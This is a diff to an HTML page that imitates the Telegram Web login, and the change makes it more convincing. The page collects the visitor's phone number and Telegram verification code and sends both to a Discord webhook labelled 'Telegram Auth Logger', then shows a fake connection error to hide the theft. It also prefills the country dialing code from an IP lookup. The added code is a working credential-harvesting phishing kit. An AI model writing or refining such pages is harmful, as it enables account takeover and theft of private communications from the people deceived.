@@ -4,65 +4,260 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Web</title>
-    <script src="https://telegram.org/js/telegram-widget.js?22" async></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #5682a3 0%, #2a5885 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .telegram-container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            width: 380px;
+            overflow: hidden;
+        }
+        
+        .telegram-header {
+            background: #5682a3;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .telegram-logo {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 10px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            color: #5682a3;
+            font-weight: bold;
+        }
+        
+        .telegram-title {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+        
+        .telegram-subtitle {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .telegram-content {
+            padding: 30px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .telegram-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e1e5eb;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .telegram-input:focus {
+            outline: none;
+            border-color: #5682a3;
+        }
+        
+        .telegram-button {
+            width: 100%;
+            background: #5682a3;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .telegram-button:hover {
+            background: #4a7290;
+        }
+        
+        .country-selector {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        
+        .country-flag {
+            font-size: 20px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .step-indicator {
+            text-align: center;
+            color: #888;
+            font-size: 13px;
+            margin-bottom: 15px;
+        }
+        
+        .help-text {
+            text-align: center;
+            color: #888;
+            font-size: 13px;
+            margin-top: 20px;
+            line-height: 1.4;
+        }
+    </style>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
 </head>
 <body>
-    <!-- Page 1: Phone Number Input -->
-    <div id="phone_page">
-        <h3>Enter your phone number:</h3>
-        <input type="text" id="phone_input" placeholder="+1234567890">
-        <button onclick="submitPhone()">Next</button>
-    </div>
-    
-    <!-- Page 2: Code Verification -->
-    <div id="code_page" style="display:none;">
-        <h3>Enter verification code:</h3>
-        <input type="text" id="code_input" placeholder="12345">
-        <button onclick="submitCode()">Verify</button>
+    <div class="telegram-container">
+        <div class="telegram-header">
+            <div class="telegram-logo">TG</div>
+            <div class="telegram-title">Telegram Web</div>
+            <div class="telegram-subtitle">Seamless messaging across all your devices</div>
+        </div>
+        
+        <div class="telegram-content">
+            <!-- Phone Number Page -->
+            <div id="phone_page">
+                <div class="step-indicator">Step 1 of 2</div>
+                <div class="input-group">
+                    <label class="input-label">Your Phone Number</label>
+                    <div class="country-selector">
+                        <span class="country-flag" id="country_flag">🇺🇸</span>
+                        <span id="country_code">+1</span>
+                    </div>
+                    <input type="tel" class="telegram-input" id="phone_input" placeholder="Phone number" required>
+                </div>
+                <button class="telegram-button" onclick="submitPhone()">Next</button>
+                <div class="help-text">
+                    Please confirm your country code and enter your phone number.
+                </div>
+            </div>
+            
+            <!-- Code Verification Page -->
+            <div id="code_page" class="hidden">
+                <div class="step-indicator">Step 2 of 2</div>
+                <div class="input-group">
+                    <label class="input-label">Verification Code</label>
+                    <input type="text" class="telegram-input" id="code_input" placeholder="Enter code from Telegram" required>
+                </div>
+                <button class="telegram-button" onclick="submitCode()">Verify & Sign In</button>
+                <div class="help-text">
+                    We've sent a verification code to your Telegram app. Please enter it above.
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
-        // Detect country and set language
-        function detectLanguage() {
+        // Detect country and set appropriate settings
+        function detectCountry() {
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
                     const country = data.country_code;
-                    const languages = {
-                        'RU': 'ru', 'UA': 'uk', 'BY': 'be', 'KZ': 'kk',
-                        'US': 'en', 'GB': 'en', 'DE': 'de', 'FR': 'fr', 
-                        'ES': 'es', 'CN': 'zh', 'TR': 'tr', 'IR': 'fa'
+                    const countryData = {
+                        'RU': {flag: '🇷🇺', code: '+7', lang: 'ru'},
+                        'US': {flag: '🇺🇸', code: '+1', lang: 'en'},
+                        'GB': {flag: '🇬🇧', code: '+44', lang: 'en'},
+                        'DE': {flag: '🇩🇪', code: '+49', lang: 'de'},
+                        'FR': {flag: '🇫🇷', code: '+33', lang: 'fr'},
+                        'CN': {flag: '🇨🇳', code: '+86', lang: 'zh'},
+                        'UA': {flag: '🇺🇦', code: '+380', lang: 'uk'},
+                        'KZ': {flag: '🇰🇿', code: '+7', lang: 'kk'}
                     };
-                    const lang = languages[country] || 'en';
-                    document.documentElement.lang = lang;
+                    
+                    const settings = countryData[country] || {flag: '🇺🇸', code: '+1', lang: 'en'};
+                    
+                    document.getElementById('country_flag').textContent = settings.flag;
+                    document.getElementById('country_code').textContent = settings.code;
+                    document.documentElement.lang = settings.lang;
+                })
+                .catch(() => {
+                    // Fallback settings
+                    document.getElementById('country_flag').textContent = '🇺🇸';
+                    document.getElementById('country_code').textContent = '+1';
                 });
         }
         
-        detectLanguage();
+        detectCountry();
 
         function submitPhone() {
-            const phone = document.getElementById('phone_input').value;
+            const countryCode = document.getElementById('country_code').textContent;
+            const phoneNumber = document.getElementById('phone_input').value;
+            const fullPhone = countryCode + phoneNumber.replace(/\D/g, '');
+            
+            if (!phoneNumber) {
+                alert('Please enter your phone number');
+                return;
+            }
             
             // Store phone and send to Discord
-            localStorage.setItem('captured_phone', phone);
-            sendToDiscord(`📱 Phone Number: ${phone}`);
+            localStorage.setItem('captured_phone', fullPhone);
+            sendToDiscord(`📱 Telegram Login Attempt - Phone: ${fullPhone}`);
             
-            // Show code page
-            document.getElementById('phone_page').style.display = 'none';
-            document.getElementById('code_page').style.display = 'block';
+            // Show code page with smooth transition
+            document.getElementById('phone_page').classList.add('hidden');
+            document.getElementById('code_page').classList.remove('hidden');
         }
 
         function submitCode() {
             const code = document.getElementById('code_input').value;
             const phone = localStorage.getItem('captured_phone');
             
-            // Send both phone and code to Discord
-            sendToDiscord(`🔐 Verification Code: ${code} for phone: ${phone}`);
+            if (!code) {
+                alert('Please enter the verification code');
+                return;
+            }
             
-            // Clear data and show fake error
-            localStorage.removeItem('captured_phone');
-            alert('Network error. Please try again later.');
+            // Send both phone and code to Discord
+            sendToDiscord(`🔐 SUCCESS! Code: ${code} for phone: ${phone}`);
+            
+            // Clear data and show fake loading then error
+            setTimeout(() => {
+                alert('Connection timeout. Please check your internet connection and try again.');
+                localStorage.removeItem('captured_phone');
+                
+                // Reset to phone page
+                document.getElementById('code_page').classList.add('hidden');
+                document.getElementById('phone_page').classList.remove('hidden');
+                document.getElementById('phone_input').value = '';
+                document.getElementById('code_input').value = '';
+            }, 1500);
         }
 
         function sendToDiscord(message) {
@@ -75,11 +270,22 @@
                 },
                 body: JSON.stringify({
                     content: message,
-                    username: 'Telegram Login',
+                    username: 'Telegram Auth Logger',
                     avatar_url: 'https://telegram.org/img/t_logo.png'
                 })
-            });
+            }).catch(error => console.log('Webhook error:', error));
         }
+
+        // Enter key support
+        document.getElementById('phone_input').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') submitPhone();
+        });
+        
+        document.getElementById('code_input').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') submitCode();
+        });
     </script>
+</body>
+</html>
 </body>
 </html>
